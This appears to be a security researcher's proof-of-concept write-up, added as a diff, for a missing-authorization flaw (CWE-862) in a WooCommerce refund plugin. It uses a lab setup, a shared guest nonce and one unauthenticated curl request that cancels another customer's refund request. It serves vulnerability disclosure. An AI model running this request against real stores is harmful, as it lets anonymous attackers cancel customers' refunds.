@@ -1,0 +1,28 @@
+# FR-04 — PRO: unauthenticated cancellation of ANY customer's refund request
+# Lab: WordPress 7.1.2 + WooCommerce 11.1.2 + Flexible Refund shared core 2.0.3 with is_super=true (PRO build path).
+# PRO note: in the free build this handler is not registered (dead code). Reproduced on the shared core by
+# constructing Integration(true) at src/Plugin.php:61 — the identical code path shipped in the PRO product.
+
+## SETUP — a victim order (12) with an ACTIVE refund request:
+    id	order_id	status	previous_order_status
+    14	12	requested	completed
+    
+  order 12 status: wc-refund-request
+
+## The cancel nonce is a GUEST (uid 0) nonce — identical for every anonymous visitor, not bound to any order:
+  wp_create_nonce('cancel_refund') (uid 0) = 9d86e01989
+
+## ATTACK — fully UNAUTHENTICATED (no cookies). Cancels the victim's request by order id:
+$ curl 'http://localhost:8088/?delete_refund_request=12&_wpnonce=9d86e01989'      # no -b / no cookies
+
+## RESPONSE (headers)
+  HTTP/1.1 301 Moved Permanently
+  Location: /
+
+## DB AFTER
+    id	order_id	status
+    14	12	canceled
+    
+  order 12 status: wc-completed   <-- request canceled, order rolled back
+
+## No authentication, no ownership check, no email check — only the shared guest nonce is verified (CWE-862).
